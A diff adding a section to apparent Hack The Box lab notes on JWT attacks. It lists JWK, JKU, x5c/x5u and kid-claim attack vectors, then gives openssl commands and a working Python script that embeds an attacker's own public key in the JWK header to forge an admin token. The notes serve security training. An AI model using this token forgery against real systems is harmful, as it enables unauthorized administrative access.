@@ -149,3 +149,53 @@ EOF
 python3 forge_admin.py
 ```
 - Copy the newly generated token and resend the landing page request with this token
+
+### Other JWT Attacks
+
+- Signing secret reuse (try using one to sign another)
+- Attack the JWK header (replace with a public key we generated)
+- Attack the JKU (same as attacking JWK except the header has url which points to a server hosting the public key)
+- JKU claim may be vulnerable to blind GET-based SSRF attacks
+- x5c and x5u claims (similar to JWK and JKU but based on the certificate/certificate chain)
+- kid claim can lead to many attacks (including path traversal, SQL injection, command injection)
+- [RFC for JWK headers](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1) 
+
+
+#### Attacking the JKU
+
+```bash
+openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
+openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
+vim exploit.py
+```
+```py
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from jose import jwk
+import jwt
+
+# JWT Payload
+jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}
+
+# convert PEM to JWK
+with open('exploit_public.pem', 'rb') as f:
+    public_key_pem = f.read()
+public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
+jwk_key = jwk.construct(public_key, algorithm='RS256')
+jwk_dict = jwk_key.to_dict()
+
+# forge JWT
+with open('exploit_private.pem', 'rb') as f:
+    private_key_pem = f.read()
+token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})
+
+print(token)
+```
+```bash
+python3 -m venv .venv
+source .venv/bin/activate
+pip3 install pyjwt cryptography python-jose
+python3 exploit.py
+# resend landing page request with generated JWT
+```
+
